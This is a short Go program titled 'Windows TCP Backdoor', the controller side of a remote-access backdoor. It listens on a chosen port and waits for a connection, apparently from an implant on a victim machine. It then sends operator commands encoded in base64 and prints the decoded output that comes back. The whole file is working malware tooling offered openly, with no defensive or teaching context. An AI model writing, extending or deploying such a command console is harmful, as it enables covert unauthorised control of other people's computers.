package main

import "net"
import "fmt"
import "bufio"
import "encoding/base64"
import "os"

func main() {
	fmt.Println("Windows TCP Backdoor")
	fmt.Print("Listen Port-> ")
	scan := bufio.NewScanner(os.Stdin)
	scan.Scan()
	ln, _ := net.Listen("tcp", ":"+scan.Text())
	conn, _ := ln.Accept()
	fmt.Println("Connected to", conn.LocalAddr().String())
	for {
		fmt.Print("Command-> ")
		scan = bufio.NewScanner(os.Stdin)
		scan.Scan()
		conn.Write([]byte(base64Encode(scan.Text()) + "\n"))
		fmt.Println("")
		message, _ := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(base64Decode(string(message)))
	}
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}
